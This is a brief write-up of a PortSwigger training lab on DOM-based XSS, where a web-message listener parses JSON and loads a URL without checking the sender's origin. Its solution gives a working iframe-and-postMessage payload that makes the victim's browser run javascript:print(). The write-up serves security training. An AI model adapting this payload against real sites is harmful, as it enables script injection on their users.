# Lab 05 — DOM XSS using web messages and JSON.parse

> **Practitioner** · [Official lab](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)

**Entry point:** a `message` listener JSON-parses the event and loads
`url` for `type: "load-channel"` — no origin check.

## Solution

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

Host it on the exploit server and deliver — the parsed message hits the
`load-channel` case, `iframe.src` becomes `javascript:print()`, and the
victim's browser executes it — lab solved.

## Notes

Same flaw as the plain web-messages lab; only the JSON.parse wrapper
changes the payload's quoting.
